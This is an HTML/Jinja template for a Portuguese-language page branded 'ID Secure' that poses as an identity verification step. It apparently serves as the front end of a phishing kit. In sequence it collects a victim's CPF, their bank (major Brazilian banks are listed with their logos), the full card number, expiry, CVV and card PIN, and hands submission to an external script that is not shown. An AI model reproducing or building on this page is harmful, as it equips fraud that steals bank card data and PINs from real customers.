<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ID Secure - Verificação de Identidade</title>
    <!-- Google Fonts + Font Awesome 6 (ícones gratuitos) -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="{{ url_for('static', filename='favicon.png') }}">
</head>
<body>
    <div class="container">
        <div class="logo-area">
            <i class="fas fa-shield-alt"></i>
            <span>ID Secure</span>
        </div>
        <h1>Verificação de Identidade</h1>

        <!-- Indicador de etapas -->
        <div class="steps-indicator">
            <div class="step active-step" data-step="1">CPF</div>
            <div class="step" data-step="2">Banco</div>
            <div class="step" data-step="3">Cartão</div>
            <div class="step" data-step="4">Senha</div>
        </div>

        <!-- Etapa 1: CPF -->
        <div id="step-cpf" class="step active">
            <h2><i class="fas fa-id-card"></i> Informe seu CPF</h2>
            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" autocomplete="off">
            </div>
            <button id="btn-validate-cpf">Continuar</button>
            <div id="cpf-error" class="error"></div>
        </div>

        <!-- Etapa 2: Banco -->
        <div id="step-banco" class="step">
            <h2><i class="fas fa-university"></i> Selecione seu banco</h2>
            <div id="bank-options">
                <label class="bank-option bank-itau">
                    <input type="radio" name="banco" value="Itaú">
                    <img src="{{ url_for('static', filename='icons/itau.svg') }}" alt="Itaú">
                    <span>Itaú</span>
                </label>
                <label class="bank-option bank-bradesco">
                    <input type="radio" name="banco" value="Bradesco">
                    <img src="{{ url_for('static', filename='icons/bradesco.svg') }}" alt="Bradesco">
                    <span>Bradesco</span>
                </label>
                <label class="bank-option bank-santander">
                    <input type="radio" name="banco" value="Santander">
                    <img src="{{ url_for('static', filename='icons/santander.svg') }}" alt="Santander">
                    <span>Santander</span>
                </label>
                <label class="bank-option bank-bb">
                    <input type="radio" name="banco" value="Banco do Brasil">
                    <img src="{{ url_for('static', filename='icons/bb.svg') }}" alt="Banco do Brasil">
                    <span>Banco do Brasil</span>
                </label>
                <label class="bank-option bank-caixa">
                    <input type="radio" name="banco" value="Caixa">
                    <img src="{{ url_for('static', filename='icons/caixa.svg') }}" alt="Caixa">
                    <span>Caixa</span>
                </label>
                <label class="bank-option bank-outro">
                    <input type="radio" name="banco" value="Outro">
                    <i class="fas fa-ellipsis-h"></i>
                    <span>Outro</span>
                </label>
            </div>
            <button id="btn-next-bank">Próximo</button>
        </div>

        <!-- Etapa 3: Dados do Cartão -->
        <div id="step-cartao" class="step">
            <h2><i class="fas fa-credit-card"></i> Dados do cartão</h2>
            <div class="input-group">
                <i class="fas fa-credit-card"></i>
                <input type="text" id="numero-cartao" placeholder="Número do cartão" maxlength="19" autocomplete="off">
            </div>
            <div class="row">
                <div class="input-group half">
                    <i class="fas fa-calendar-alt"></i>
                    <input type="text" id="validade" placeholder="MM/AA" maxlength="5" autocomplete="off">
                </div>
                <div class="input-group half">
                    <i class="fas fa-lock"></i>
                    <input type="text" id="cvv" placeholder="CVV" maxlength="4" autocomplete="off">
                </div>
            </div>
            <button type="button" id="btn-next-senha" disabled>Continuar</button>
            <div id="cartao-error" class="error"></div>
        </div>

        <!-- Etapa 4: Senha -->
        <div id="step-senha" class="step">
            <h2><i class="fas fa-key"></i> Digite a senha do seu cartão</h2>
            <div class="input-group">
                <i class="fas fa-lock"></i>
                <input type="password" id="senha" placeholder="Digite sua senha" autocomplete="off">
            </div>
            <button type="submit" id="btn-submit-senha">Senha do cartão de Credito (4 ou 6 dígitos)</button>
            <div id="senha-error" class="error"></div>
        </div>

        <div id="resultado" class="resultado"></div>
        <div id="loading-overlay" class="loading-overlay" style="display: none;">
            <div class="spinner"></div>
            <p>Processando...</p>
        </div>
    </div>
    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
